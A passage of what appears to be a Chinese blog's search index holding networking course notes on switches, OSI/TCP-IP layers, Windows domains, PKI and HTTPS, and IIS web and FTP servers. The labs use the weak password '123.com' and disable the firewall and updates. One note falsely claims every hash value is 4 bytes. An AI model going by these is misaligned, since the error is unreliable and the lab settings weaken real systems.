title="模块标记"></a>模块标记</h6><p>F0/1：百兆接口，第0个模块的第一个接口。（模块：交换机接口的分区）</p><h5 id="交换机-网桥-的工作原理"><a href="#交换机-网桥-的工作原理" class="headerlink" title="交换机(网桥)的工作原理"></a>交换机(网桥)的工作原理</h5><p><strong>MAC地址表</strong>：记录接口和连接此接口的主机MAC地址。 [AA F0/1]</p><p><strong>交换机的学习</strong>：每个从交换机经过的帧都将源MAC地址和<u>进入的</u>交换机接口号记录。</p><p><strong>广播/单播</strong>：交换机转换数据包时用目标MAC地址查询匹配MAC地址表，如果有目标MAC地址直接单播，没目标MAC地址直接将该数据包广播。</p><p><strong>老化时间</strong>：某一接口在5分钟内无任何数据包发送则会清除该接口MAC地址记录。</p><p><strong>MAC地址表的更新</strong>：某一接口更换MAC地址，则立即更新。</p><p><a href="https://imgchr.com/i/NpqKuq"><img src="https://s1.ax1x.com/2020/06/15/NpqKuq.png" alt="NpqKuq.png"></a></p><h4 id="如何配置交换机"><a href="#如何配置交换机" class="headerlink" title="如何配置交换机"></a>如何配置交换机</h4><p><strong>傻瓜式交换机</strong>不支持配置</p><p><strong>企业级交换机</strong>支持配置高级功能及高级配置，价格高，一般称为<u>企业管理型交换机</u></p><p>juniper、华为、锐捷、启明、天融信、360</p><p>购买一台cisco思科交换机，一般会自带一根console线！如何配置？看下图</p><p><a href="https://imgchr.com/i/NkDoWV"><img src="https://s1.ax1x.com/2020/06/16/NkDoWV.png" alt="NkDoWV.png"></a></p><p>console口：控制台接口； console线(com口连接电脑)：连接电脑配置交换机。</p><p><a href="https://imgchr.com/i/NkDOeJ"><img src="https://s1.ax1x.com/2020/06/16/NkDOeJ.png" alt="NkDOeJ.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12、OSI和TCP/IP模型</title>
      <link href="/2020/06/13/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/12%E3%80%81OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/"/>
      <url>/2020/06/13/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/12%E3%80%81OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI和TCP-IP模型"><a href="#OSI和TCP-IP模型" class="headerlink" title="OSI和TCP/IP模型"></a>OSI和TCP/IP模型</h2><h3 id="一、分层思想"><a href="#一、分层思想" class="headerlink" title="一、分层思想"></a>一、分层思想</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>1、降低工作量，提高工作效率。</p><p>2、每一层的工作和协议都是独立的（专注独立的做自己的事情）。</p><p>3、下层为上层提供服务。</p><h3 id="二、OSI七层模型-Open-System-interconnection"><a href="#二、OSI七层模型-Open-System-interconnection" class="headerlink" title="二、OSI七层模型(Open System interconnection)"></a>二、OSI七层模型(Open System interconnection)</h3><p>应用层：应用软件的信息协议（QQ、HTTP），主要用作是传输软件数据。</p><p>表示层：将信息通过字符编码协议进行数字编码。</p><p>会话层：协调应用会话的发送顺序。（QQ\WX\PUBG谁先从网线走，谁后走）</p><p>应用层、表示层和会话层 合并成一层！ 应用层！这就是TCP/IP五层模型！</p><h3 id="三、TCP-IP五层模型"><a href="#三、TCP-IP五层模型" class="headerlink" title="三、TCP/IP五层模型"></a>三、TCP/IP五层模型</h3><h4 id="前言"><a href="#前言" class="headerlink" title="- 前言"></a>- 前言</h4><p>虽然OSI七层模型是世界标准组织发布的第一个网络模型，但是实际上没有被广泛应用。被广泛应用至今的是TCP/IP五层模型。名字由来是因为TCP和IP协议是网络模型中最重要的两个协议。</p><p><a href="https://imgchr.com/i/NSrOUO"><img src="https://s1.ax1x.com/2020/06/14/NSrOUO.png" alt="NSrOUO.png"></a></p><h4 id="TCP-IP五层模型数据的封装与解封"><a href="#TCP-IP五层模型数据的封装与解封" class="headerlink" title="- TCP/IP五层模型数据的封装与解封"></a>- TCP/IP五层模型数据的封装与解封</h4><h5 id="数据包封装"><a href="#数据包封装" class="headerlink" title="==========数据包封装"></a>==========数据包封装</h5><p><strong>应用层</strong>：见上。<u>(HTTP 80、HTTPS 443、TELNET 23、FTP 20 21、RDP 3389、SMB 445、Mysql 3306 、DHCP 67/68 <strong>UDP</strong>、DNS 53 <strong>TCP&amp;UDP</strong>[1]、SMTP 25、POP3 110)</u>#缺省TCP协议#</p><p><strong>传输层</strong>：加一个TCP/UDP包头，主要目的是完成进程与进程之间通信，在数据包头中加入源端口号和目标端口号数据段。<u>（TCP、UDP）</u>{防火墙}</p><p><strong>网络层</strong>：加一个IP包头，源IP、目标IP。<u>（IP、ICMP、ARP）</u>{路由器}</p><p><strong>数据链路层</strong>（到达网卡）：网络层的数据 + MAC子层（帧头[火车头]）、FCS（帧尾[火车头]），形成一个帧数据包。<u>（MAC子层协议）</u>{交换机}</p><p><strong>物理层</strong>（网线）：一个一个帧包传输送走。{网线、空气、光纤}</p><h5 id="数据包解封"><a href="#数据包解封" class="headerlink" title="========数据包解封"></a>========数据包解封</h5><p>解封时，每一层只专注于自己加工的位置。</p><h5 id="术词定义"><a href="#术词定义" class="headerlink" title="术词定义"></a>术词定义</h5><p>1、高层数据：应用层的数据</p><p>2、段：传输层的数据。</p><p>3、报文/IP包/包：网络层的数据。</p><p>4、帧：数据链路层的数据，（MAC帧头、FCS帧尾）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">问题：1、每层常见协议 2、应用层常见协议端口 3、应用层和运输层的关联 4、每层的运输单元 5、每层的工作设备</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11、Windows域</title>
      <link href="/2020/06/09/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/11%E3%80%81%E5%9F%9F/"/>
      <url>/2020/06/09/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/11%E3%80%81%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows域"><a href="#Windows域" class="headerlink" title="Windows域"></a>Windows域</h2><h3 id="一、域的基本概念"><a href="#一、域的基本概念" class="headerlink" title="一、域的基本概念"></a>一、域的基本概念</h3><p>域（Domain）：一种<u>网络环境</u>。</p><p><strong>网络环境：</strong></p><p>1、域环境：不平等环境，角色有等级之分，更方便集中管理、统一管理。</p><p>2、工作组环境：默认模式，人人平等。缺点：不方便管理。</p><p><strong>域的特点</strong>：集中管理、统一管理。</p><p><strong>域的成员组成</strong>：</p><p>1、域控制器DC（Domain Controller）：AD活动目录、组策略GPO</p><p>2、成员机</p><p><strong>域名</strong>：整个域环境的名字（例如：qq.com）。</p><p><strong>主机名</strong>：域中的主机名（例如：zjc.qq.com），主机可以被分配到不同的OU中。</p><p><strong>OU（组织单位）</strong>：OU是组策略的下发单位，<strong>域也是OU，是最大的OU</strong>。</p><h3 id="二、组策略"><a href="#二、组策略" class="headerlink" title="二、组策略"></a>二、组策略</h3><p>组策略：Group Policy == GPO，可以对AD活动目录中的不同部门设置不同的GPO组策略，实现不同的控制。</p><p>下发组策略：使用<u>组策略管理</u>的模块进行设置。</p><p>组策略生效的顺序：L(本地)S(站点/林)D(域)OU(组织架构)</p><p><u>强制组策略</u>：使下级组织架构OU的组策略不生效（DC不下发下级组单位的组策略）。（右键策略 -》 强制）</p><p><u>阻止继承</u>：不继承上级的组策略，只生效自己OU设置的组策略。（）（右键组织架构文件夹 -》 组织继承）</p><p><u>让一个用户不受任何策略的影响</u>：设置该用户的组织单位策略强制，然后在强制策略的权限中将该用户添加，然后设置高级设置让此用户拒绝所有权限。</p><h3 id="三、域的部署"><a href="#三、域的部署" class="headerlink" title="### 三、域的部署"></a>### 三、域的部署</h3><p>要想部署域环境 —》 首先需要一台域控制器DC</p><p>要想安装一台DC –》 需要安装“AD活动目录” 和 “DNS服务器”</p><blockquote><p>活动目录：Active Directory == AD， DNS在域中的作用：定位寻址主机。</p></blockquote><hr><blockquote><p>实验环境：Win2008域控制、XP域用户、win7域用户</p><p>1、还原快照，开启2008虚拟机，桥接vmnet1，配置静态地址10.1.1.2/24（禁用ipv6！重开网卡清除ipv6缓存！）修改计算机名为DC1！</p><p>2、活动目录的安装向导：开始 -》 运行 -》 <strong>dcpromo</strong> -》 弹出向导 -》</p><p>选择向导中安装DNS服务器（方便正确关联，为了提醒自动安装DNS服务器，不要配置DNS地址）-》</p><p>林的概念（域（业务）、域树（加入业务分公司，形成域树）、森林（多个业务树））整个林中最牛逼的是第一个DC服务器 ，创建新林 -》</p><p>设置林根域的FQDN（完全限定域名） zjccorp.com -》</p><p>林功能级别，设置整个森林DC服务器的能力等级（服务器版本），所以其他域树一定不能低于这个服务器版本 （建议选2003） -》</p><p>域功能级别，设置该域的DC服务器的能力等级（服务器版本），所以该域中如果出现其他DC服务器，一定不能低于这个服务器版本（建议选择2003） -》</p><p>AD数据库、日志文件、策略文件的存储位置（默认）-》</p><p>设置一个目录还原模式的账户密码（123.com） -》</p><p>安装，勾选完成后重新启动</p><p>3、重启后登录DC：发现本地管理员Administrator已经升级成为域管理员 ==二级域名\用户名、本地来宾guest升级为域来宾账号。本地用户都移动到AD活动目录中去了。</p><p>4、验证DC是否部署成功：查看计算机名是否修改为 计算机名.二级域名.com，并且新增了域字段： zjccorp.com。</p><p>5、查看管理工具，新增了DNS、ACtive DIrectory*等。验证DNS是否部署成功。</p><p>6、打开Active Directory用户和计算机 ，验证是否可以打开、是否报错。发现Users中找到了我们原来的本地账户（已升级为域用户）。Domain Admins组、Domain Users（默认域用户都在这）组。computers用户计算机、Domain Controllers域控制器。</p><p>7、员工机器加入域，测试域是否部署成功：</p><p>将客户机Xp加入域：还原快照、桥接vmnet1、配置IP10.1.1.1/24、DNS服务、修改主机名</p><p>更改工作组到域：计算机管理 -》 更改工作组 -》隶属于域 zjccorp.com，输入域管理账户密码zjccorp.com\administrator ; 123.com。</p><p>8、服务器验证员工是否成功加入域：DCDomain Controller验证computer组是否加入客户机，看DNS是否存在客户机。</p><p>9、域控制器给员工创建域账号：一般用户登录名叫jiacheng.zhong，美式标记法。密码要符合复杂性要求123.com。查看users中，新增了域账户，隶属domain users组</p><p>10、员工登陆测试：选项 -》 选择本机工作组还是域 -》输入账号密码，成功登录</p><p>11、使用win7用户测试创建域用户以及登录一次</p><p>12、下发组策略是以部门为单位，所以要创建<strong>组织架构（OU）</strong>：</p><p>​            域 右键 -》 新建组织单位 -》 设置名称：天融信集团 ；</p><p>​            新建天融信集团的子组织单位： 右键天融信集团 -》 新建组织架构 </p><p>。。。。。。</p><p>​            组织中加入成员： 在 Users中选择用户 右键 -》 所有任务 -》 移动</p><p>13、创建组策略： 组策略管理 -》 右键OC -》 创建GPO，或者在已有的组策略对象中选择组策略链接</p><p>14、编辑组策略：对准策略右键编辑 -》 用户配置 （策略就近原则），使用服务器资源要启动共享，并设置NTFS权限！</p></blockquote><p>实验结果总结：主机要想在DNS服务器上注册，必须要配置DNS服务器！可以用员工账号去加入域。活动目录中的计算机名是主机的计算机名，DNS中的主机名也是计算机名。</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10、PKI（公钥基础设施）</title>
      <link href="/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/10%E3%80%81PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/"/>
      <url>/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/10%E3%80%81PKI%EF%BC%88%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="PKI（公钥基础设施）"><a href="#PKI（公钥基础设施）" class="headerlink" title="PKI（公钥基础设施）"></a>PKI（公钥基础设施）</h2><h3 id="PKI概述"><a href="#PKI概述" class="headerlink" title="PKI概述"></a>PKI概述</h3><p>Public Key Infrastructure(<em>PKI</em>),中文叫做公开密钥基础设施</p><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p><strong>PKI基础设施的组成</strong>：公钥加密技术、数字证书、CA、RA。</p><p><strong>信息安全三要素/四要素</strong>：机密性、完整性、身份验证（可用性？）、（不可否认性）</p><p><strong>使用到PKI技术的IT领域</strong>：https（s:SSL/pki）、VPN–IPsecVPN、VPN–部分远程访问VPN</p><h3 id="公钥加密技术"><a href="#公钥加密技术" class="headerlink" title="公钥加密技术"></a>公钥加密技术</h3><p><strong>作用</strong>：通过 <u>加密技术</u> 和 <u>数字签名</u> 保证<strong>信息</strong>存储和传输的安全。</p><p>算法概念：x+5=y，x原数据、y密文、5密钥。</p><h4 id="加密算法分类"><a href="#加密算法分类" class="headerlink" title="加密算法分类"></a>加密算法分类</h4><h5 id="1、对称加密算法：加密和解密的密钥一致。"><a href="#1、对称加密算法：加密和解密的密钥一致。" class="headerlink" title="1、对称加密算法：加密和解密的密钥一致。"></a>1、对称加密算法：加密和解密的密钥一致。</h5><p><strong>优点</strong>：加密速度快；<strong>缺点</strong>：密钥容易被截获</p><p><strong>常见算法</strong>：DES、3DES、<strong>AES</strong>。Data/Advanced Encryption Standard，AES最常见。</p><h5 id="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"><a href="#2、非对称加密算法：加密和解密的密钥不同，称为公私钥。" class="headerlink" title="2、非对称加密算法：加密和解密的密钥不同，称为公私钥。"></a>2、非对称加密算法：加密和解密的密钥不同，称为公私钥。</h5><p><strong>公私钥</strong>：非对称加密算法自己产生一对公私钥，不需要双方协商。（公钥私钥孪生，不可互相逆推）双方公钥明文发送，私钥自我保留。</p><p><strong>优点</strong>：安全（完整性、机密性）；<strong>缺点</strong>：效率低、速度慢。</p><p><strong>流程</strong>：<u>双方各持有RSA公私钥，然后交换公钥。使用对方公钥加密并使用哈希算法计算密文指纹，再使用私钥加密指纹。最后将加密指纹和密文共同发送。</u></p><p><u>私钥加密指纹，中间人可截取使用公钥破译但破译无意义，由于私钥完全隐私所以无法伪造指纹，以成功保证数据传输的完整性和机密性。</u></p><p><a href="https://imgchr.com/i/UCEIsS"><img src="https://s1.ax1x.com/2020/07/06/UCEIsS.png" alt="UCEIsS.png"></a></p><p><strong>第三方公证机构（证书颁发发机构 CA认证/RA注册审批）</strong>：为了防止中间人在一开始就伪装通信双方公钥进行消息截取，就要寻求<u>公证机构</u>的验证帮助。服务器在封闭安全的环境内向<u>公证机构</u>发送自己的域名、IP、公钥等信息，<u>公证机构</u>会对服务器的信息生成一个钢印（加密指纹）（通过哈希形成指纹然后使用私钥进行RSA加密），然后生成一个服务器数字证书（信息（域名、IP、公钥等信息）+钢印）发送给服务器。</p><p>后面服务器和客户机进行通信时，先发送数字证书给客户机，客户机使用公证机构的公钥对钢印进行RSA解密，得到HASH钢印指纹，再对除钢印以外的证书内容进行HASH计算得到HASH普通指纹，然后用普通指纹和钢印指纹进行对比，如果相同，则说明服务器是通过公证机构认证的、安全的服务器。</p><p><u>世界上比较出名的根证书颁发机构已经内置在了浏览器中。</u></p><p><a href="https://imgchr.com/i/UCVawQ"><img src="https://s1.ax1x.com/2020/07/06/UCVawQ.png" alt="UCVawQ.png"></a></p><p><strong>CA（证书颁发机构）</strong>：接受申请，制作<u>数字证书</u>，颁发<strong>数字证书</strong>。</p><p><strong>数字证书</strong>：用于公正并保证公钥的合法性</p><p><strong>数字证书格式</strong>：遵循X.509标准。</p><p><strong>证书内容</strong>：使用者的公钥、使用者的标识信息（域名、IP、名称、电子邮箱地址）、证书有效期、颁发者的标识信息（公证机构）、颁发者的数字签名（钢印）。</p><p><strong>常见算法</strong>：RSA（HTTPS用的算法）、DH（迪菲·赫尔曼发明）、</p><h5 id="3、哈希算法："><a href="#3、哈希算法：" class="headerlink" title="3、哈希算法："></a>3、哈希算法：</h5><p>常见的哈希算法：MD5、SHA</p><p>哈希加密算法不可逆。无论数据多大加密后都是4字节的哈希值（hash值、指纹、摘要）。<strong>主要用于计算数据是否正确与完整。</strong></p><h3 id="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"><a href="#实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）" class="headerlink" title="实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）"></a>实验：部署HTTPS服务器（CA服务器、Web服务器、DNS服务器）</h3><blockquote><p>实验目标：部署HTTPS服务器</p><p>实验环境：windows2008作为HTTPS服务器（10.1.1.2）、win7作为客户机（10.1.1.1），桥接vmnet1。</p><p>实验步骤：</p><p>1、还原快照、桥接、配置网络地址信息、禁用再启用（清除ipv6缓存信息）</p><p>2、安装IIS，windows2008服务安装包已经内置在系统中。计算机右键 -》服务器管理 -》添加角色 -》Web服务器（IIS） -》安装。<strong>不要动IIS自带的默认网站！默认网站会被CA装载服务网页！</strong></p><p>3、准备网站文件夹flower在D盘，在Web服务器中添加网站，<strong>绑定</strong>域名、IP、子网掩码，先使用的是http协议（因为暂时无法使用https）。设置默认文档。</p><p>4、在IIS中安装DNS角色。然后使用客户机尝试访问网站。</p><p>5、安装CA组件：计算机右键 -》服务器管理 -》添加角色 -》Active Directory证书颁发机构-》角色服务再选择证书颁发机构Web注册 -》修改CA的公用名称（CAzongju）-》安装，去Web服务器给注册网站绑定域名（<a href="http://www.ca.com).dns服务器域名解析.客户机访问www.ca.com/certsrv%E6%B5%8B%E8%AF%95%E3%80%82">www.ca.com）。DNS服务器域名解析。客户机访问www.ca.com/certsrv测试。</a></p><p>6、在windows2008的IIS中，写证书申请单：左键总服务器-》服务器证书-》创建证书申请-》通用名称必须和网站域名相同-》生成证书申请txt文件（base64编码）</p><p>7、向CA提交证书申请：在服务器上访问CA的注册网站（防止网页信任弹窗的方法：降低windows2008服务器的安全级别：服务器管理器-》配置IE EXC-》禁用） -》 申请证书 -》高级证书申请 -》使用base64编码申请 -》 提交</p><p>8、CA服务器审核并颁发证书：管理工具-》证书颁发机构-》挂起的申请-》右键所有任务、颁发。</p><p>9、服务器安装证书：服务器去证书申请网站-》查看挂起的申请证书-》下载证书。总Web服务器-》服务器证书-》完成证书申请-》写一个好记名称flower</p><p>10、服务器使用证书：选择Web服务器中的网页 -》 添加网页绑定 -》选择https类型并且选择刚刚安装的证书。</p><p>11、客户机使用https访问flower网站进行初步测试，会显示证书无效，但可继续访问。</p><p>12、客户机浏览器添加信任我们的证书机构（获得证书公钥）：去证书机构注册网站上下载当前CA机构证书。浏览器选项-》内容-》证书-》受信任的根证书颁发机构-》导入-》导入我们的CA机构证书。</p><p>或者直接双击CA机构证书-》安装证书-》浏览选择安装到受信任的根证书颁发机构。</p><p>13、禁用服务器的http访问，只允许https访问：Web服务器flower-》SSL设置-》选中要求SSL-》点击右侧的应用。然后验证是否成功。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9、部署windows2008</title>
      <link href="/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/9%E3%80%81%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/"/>
      <url>/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/9%E3%80%81%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9Awindows2008/</url>
      
        <content type="html"><![CDATA[<h3 id="环境准备：部署windows2008"><a href="#环境准备：部署windows2008" class="headerlink" title="环境准备：部署windows2008"></a>环境准备：部署windows2008</h3><p>选择enterprise完整版本。自定义安装</p><p>1、新建文件夹windows2008-1，新建虚拟机（单个文件，稍后安装操作系统），插入ISO镜像，分配1G内存。</p><p>2、开机分区，20G给C盘，D盘进入系统再分。</p><p>3、安装完毕2008需要先设置高强度密码123.com</p><p>4、设置以后不弹出两个讨厌的对话框</p><p>5、调出桌面图标：开始-》搜索ion/图标-》显示或隐藏桌面图标</p><p>6、分区D盘格式化：计算机-》管理-》存储-》磁盘存储</p><p>7、关闭防火墙和自动更新</p><p>8、安装vmtools重启</p><p>9、搜索文件夹选项，关闭隐藏文件夹拓展名 -》 神秘的东方力量，重启验证</p><p>10、关机做快照</p><hr><p>查看Windows已打补丁信息：<code>systeminfo</code></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、IIS容器搭建——FTP服务器</title>
      <link href="/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/8%E3%80%81IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/8%E3%80%81IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS容器搭建——FTP服务器"><a href="#IIS容器搭建——FTP服务器" class="headerlink" title="IIS容器搭建——FTP服务器"></a>IIS容器搭建——FTP服务器</h2><h3 id="1、FTP服务器概述"><a href="#1、FTP服务器概述" class="headerlink" title="1、FTP服务器概述"></a>1、FTP服务器概述</h3><p>File Transfor Protocol === 文件传输服务器</p><p>FTP服务器功能与SMB文件共享服务器（port445）几乎相同。</p><p>一般来说 公司内部文件共享使用SMB服务、对外文件共享使用FTP服务器</p><h3 id="2、FTP协议端口"><a href="#2、FTP协议端口" class="headerlink" title="2、FTP协议端口"></a>2、FTP协议端口</h3><p>20端口：数据端口（默认不开启，只有在传输数据时才打开使用，传输完毕，端口关闭）</p><p>21端口：控制端口（身份验证、指令传送等）</p><p><code>ftp://IP地址</code></p><h3 id="3、使用IIS容器发布部署FTP服务器"><a href="#3、使用IIS容器发布部署FTP服务器" class="headerlink" title="3、使用IIS容器发布部署FTP服务器"></a>3、使用IIS容器发布部署FTP服务器</h3><blockquote><p>1、服务器和客户机配置IP、子网掩码、ping通，服务器安装FTP服务器插件</p><p>2、默认FTP站点 C:\Inetpub\ftproot, 建议禁用默认的FTP站点</p><p>3、新建FTP文件夹（笔记、课件、上传作业）、创建FTP站点，设置FTP权限建议全选。<strong>（FTP权限和NTFS权限取交集）</strong></p><p>4、设置文件夹NTFS权限，测试FTP登录是否需要账户密码，如果仍然不需要，去服务器中将FTP站点属性的安全账户中把允许匿名连接关闭。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、IIS容器搭建——WEB服务器</title>
      <link href="/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/7%E3%80%81IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/7%E3%80%81IIS%E5%AE%B9%E5%99%A8%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS容器搭建——WEB服务器"><a href="#IIS容器搭建——WEB服务器" class="headerlink" title="IIS容器搭建——WEB服务器"></a>IIS容器搭建——WEB服务器</h2><h3 id="1、Web服务器概述"><a href="#1、Web服务器概述" class="headerlink" title="1、Web服务器概述"></a>1、Web服务器概述</h3><p>web服务器一般也称为网页服务器、HTTP服务器。</p><p>通过Web服务器可以将我们做好的Web通过网络发布出去，让客户机通过网络可以远程访问。例如：京东Web服务器、百度Web服务器。</p><h3 id="2、协议"><a href="#2、协议" class="headerlink" title="2、协议"></a>2、协议</h3><p>前面已经学过：SMB协议、telnet协议、RDP协议、DHCP协议等。</p><p>Web服务器使用的协议是：<strong>http协议、https协议</strong>。</p><h3 id="3、HTTP-S协议端口号"><a href="#3、HTTP-S协议端口号" class="headerlink" title="3、HTTP/S协议端口号"></a>3、HTTP/S协议端口号</h3><p>http：80；https：443</p><h3 id="4、Web容器（Http服务软件）"><a href="#4、Web容器（Http服务软件）" class="headerlink" title="4、Web容器（Http服务软件）"></a>4、Web容器（Http服务软件）</h3><p><strong>微软：IIS</strong>（IIS服务软件额可以发布Web服务器、发布FTP服务器）</p><p><strong>Linux：Apache、Tomcat、nginx</strong>等</p><p><strong>第三方学习用：phpstudy、XAMPP、WAMP</strong>等等。</p><h3 id="5、服务器部署Web容器"><a href="#5、服务器部署Web容器" class="headerlink" title="5、服务器部署Web容器"></a>5、服务器部署Web容器</h3><blockquote><p>1、桥接客户机、服务器，配置IP、子网掩码。ping测试连通性</p><p>2、Windows2003光盘中“应用程序服务器”安装“IIS信息服务”的“万维网服务”插件。验证80端口是否打开。（安装报错的原因是光盘默认是D盘，但电脑中存在D盘，导致找不到光盘中的内容）</p><p>３、万维网服务管理－》默认网站属性－》主目录　找到IIS默认发布好的网页路径：C:\inetpub\wwwroot ，IIS提供的默认网站有漏洞，所以建议-》停止默认网站。停止后，网页服务器没有发布的网页了，再次查看发现80端口自动关闭了。</p><p>4、自定义新建发布网站，网页路径不要放在C盘！文件夹名不允许中文。</p><p>创建网页文件夹：D盘下建立文件夹-》两个html网页，一个网页超链接另一个；</p><p>发布网页：右键网页服务器-》新建网页-》描述是名称随便-》IP和端口号绑定-》选择发布网站文件夹并允许匿名访问网站-》访问权限读取即可                             </p><p>设置默认文档（首页s）：访问IP端口号自动首先打开的网页。网站属性-》文档-》添加默认文档</p><p>5、发布第二个网站：例如hr系统，发布好之后发现自动停止状态（80端口已经占用），改变端口，使用客户机尝试访问。（不要忘记设置默认文档）</p><p>6、发布第三个网站：端口8080（常见）</p><p>7、将baidu和flower绑定同一个端口号提供服务（hosts文件代替DNS服务器）。</p><p><strong>一个网页服务器发布多个网页同时同一个端口的方法，就是设置网页的高级网站标识，标识方式除了IP、端口号还需要主机头值（全限定域名）。设置好后，客户机需要通过域名访问，才能访问到对应的网页。（原理猜想：浏览器在通过DNS解析向服务器发送http请求时，会将客户机的访问域名也包括在数据包中，Web服务器就可以通过客户机的访问域名来给客户机返回网页了）</strong></p><p>8、发布两个动态网页：网站访问权限要勾选运行脚本、Web服务拓展开启Active Server Pages（ASP）。</p></blockquote><h3 id="6、网站类型"><a href="#6、网站类型" class="headerlink" title="6、网站类型"></a>6、网站类型</h3><h4 id="1）静态网站：无数据库操作"><a href="#1）静态网站：无数据库操作" class="headerlink" title="1）静态网站：无数据库操作"></a>1）静态网站：无数据库操作</h4><h4 id="2）动态网站：有数据库操作"><a href="#2）动态网站：有数据库操作" class="headerlink" title="2）动态网站：有数据库操作"></a>2）动态网站：有数据库操作</h4><p>前端和数据库连接的中间件：php、asp、python 。</p><p>微软IIS只支持：静态网站 + asp、sqlserver。</p><p>LAMP：Linux + apache + mysql + php; 静态网站 + php + mysql</p><p>WAMP：Windows + apache + mysql + php</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、DNS服务器部署与安全</title>
      <link href="/2020/06/02/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/6%E3%80%81DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/06/02/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/6%E3%80%81DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
